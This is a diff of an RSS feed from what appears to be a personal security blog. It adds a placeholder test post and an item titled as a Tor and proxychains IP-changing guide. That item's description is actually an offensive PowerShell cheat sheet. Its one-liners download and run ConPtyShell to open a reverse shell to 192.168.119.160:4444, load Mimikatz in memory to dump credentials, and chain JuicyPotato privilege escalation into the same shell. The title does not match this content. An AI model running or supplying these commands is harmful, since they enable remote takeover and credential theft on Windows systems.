@@ -6,7 +6,29 @@
     <description>Recent content in Posts on MrJcK</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 30 Jul 2023 21:15:43 +0300</lastBuildDate><atom:link href="https://mrjck.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 01 Aug 2024 22:26:12 +0400</lastBuildDate><atom:link href="https://mrjck.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Test</title>
+      <link>https://mrjck.github.io/posts/test/</link>
+      <pubDate>Thu, 01 Aug 2024 22:26:12 +0400</pubDate>
+      
+      <guid>https://mrjck.github.io/posts/test/</guid>
+      <description>theis tis file</description>
+    </item>
+    
+    <item>
+      <title>Changing Our Public IP Using Tor and Chicel and Proxychain</title>
+      <link>https://mrjck.github.io/posts/changing-our-public-ip-using-tor-and-chicel-and-proxychain/</link>
+      <pubDate>Thu, 01 Aug 2024 21:12:08 +0400</pubDate>
+      
+      <guid>https://mrjck.github.io/posts/changing-our-public-ip-using-tor-and-chicel-and-proxychain/</guid>
+      <description>Powershell
+ConPtyShell
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80 Execute mimikatz directly in memory
+IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.119.160:4444/Invoke-Mimikatz.ps1’);Invoke-Mimikatz JuicyPotato
+JuicyPotato -l 1337 -p c:32.exe -a “/c powershell.exe IEX(IWR http://192.168.119.160/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80” -t *</description>
+    </item>
+    
     <item>
       <title>Windows Privilege Escalation</title>
       <link>https://mrjck.github.io/posts/windows/windows-privilege-escalation/</link>
